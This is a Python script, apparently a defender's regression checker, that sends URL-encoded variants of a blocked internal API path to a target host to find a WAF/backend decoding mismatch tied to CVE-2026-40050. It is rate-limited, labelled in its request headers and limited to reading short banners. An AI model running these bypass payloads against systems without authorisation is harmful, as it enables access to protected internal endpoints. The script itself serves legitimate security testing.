#!/usr/bin/env python3
"""
encoding_variants.py — WAF/backend URL-decoding-mismatch probe.

Sends a series of path-encoding permutations of /api/v1/internal/status
against a target host and prints which ones the perimeter blocks and
which ones the backend serves. Useful as a regression test for any
WAF rule that does literal path matching against a backend that
URL-decodes before routing.

Usage:
    python3 encoding_variants.py https://target.example.com

Behaviour:
    - HTTP/1.1 only, sequential, 3 s between requests.
    - Identifying header `X-Research-Probe: defender-checklist` set on
      every request so defenders reviewing logs can see what hit them.
    - Stops on the first 5xx (likely backend distress; do not pile on).
    - Does NOT extract response bodies beyond the first 200 bytes,
      which is enough to surface the version banner if the bypass
      lands but not enough to walk the cluster API.

License: MIT. Run only against hosts you own or have explicit
written permission to test.
"""

from __future__ import annotations
import sys
import time
import urllib.parse
import urllib.request


VARIANTS: list[tuple[str, str]] = [
    ("canonical (blocked baseline)", "/api/v1/internal/status"),
    ("i -> %69",                     "/api/v1/%69nternal/status"),
    ("n -> %6E",                     "/api/v1/i%6Eternal/status"),
    ("n -> %6e (lowercase)",         "/api/v1/i%6eternal/status"),
    ("t -> %74",                     "/api/v1/in%74ernal/status"),
    ("e -> %65",                     "/api/v1/int%65rnal/status"),
    ("r -> %72",                     "/api/v1/inte%72nal/status"),
    ("n -> %6E (3rd n)",             "/api/v1/inter%6Eal/status"),
    ("a -> %61",                     "/api/v1/intern%61l/status"),
    ("l -> %6C",                     "/api/v1/interna%6C/status"),
    ("double-slash split",           "/api/v1//internal/status"),
    ("upper-segment + encoding",     "/api/v1/InTeRn%41l/status"),
]

HEADERS = {
    "X-Research-Probe": "defender-checklist",
    "User-Agent":       "cve-2026-40050-checker/1.0",
}

DELAY_SECONDS = 3
BODY_PEEK = 200


def probe(base: str, path: str) -> tuple[int, str, str]:
    url = base.rstrip("/") + path
    req = urllib.request.Request(url, headers=HEADERS, method="GET")
    try:
        with urllib.request.urlopen(req, timeout=15) as resp:
            body = resp.read(BODY_PEEK).decode("utf-8", "replace")
            return resp.status, resp.headers.get("Content-Type", ""), body
    except urllib.error.HTTPError as e:
        body = e.read(BODY_PEEK).decode("utf-8", "replace") if e.fp else ""
        return e.code, e.headers.get("Content-Type", "") if e.headers else "", body
    except Exception as e:  # noqa: BLE001
        return -1, "", f"<request error: {e!r}>"


def main(argv: list[str]) -> int:
    if len(argv) != 2:
        print(f"usage: {argv[0]} <target-base-url>", file=sys.stderr)
        return 2
    base = argv[1].rstrip("/")
    if not base.startswith(("http://", "https://")):
        print("error: target must be a full URL with scheme", file=sys.stderr)
        return 2

    print(f"# target: {base}")
    print(f"# header: {HEADERS}")
    print(f"# delay : {DELAY_SECONDS}s between requests")
    print()
    print(f"{'label':<40} {'status':>6}  notes")
    print("-" * 90)

    for label, path in VARIANTS:
        status, ctype, body = probe(base, path)

        if status == 403:
            note = "WAF / perimeter rule fired"
        elif status == 401:
            note = "auth challenge (different handler reached)"
        elif status == 200:
            note = f"BACKEND REACHED — Content-Type={ctype}"
            if "version" in body.lower():
                # find a short banner-like substring to surface
                idx = body.lower().find("version")
                excerpt = body[max(0, idx - 5):idx + 80].replace("\n", " ")
                note += f"; banner~={excerpt!r}"
        elif 500 <= status < 600:
            note = "5xx — stopping run, do not pile on"
        elif status == -1:
            note = body
        else:
            note = f"unexpected status {status}, body[:80]={body[:80]!r}"

        print(f"{label:<40} {status:>6}  {note}")

        if 500 <= status < 600:
            return 1

        time.sleep(DELAY_SECONDS)

    print()
    print("# done. any non-403 row above is a perimeter/backend mismatch worth")
    print("# resolving. if /api/v1/internal/status returned 200 under any")
    print("# encoding, the WAF rule is decorative and CVE-2026-40050 is")
    print("# reachable on this host irrespective of version banner.")
    return 0


if __name__ == "__main__":
    sys.exit(main(sys.argv))
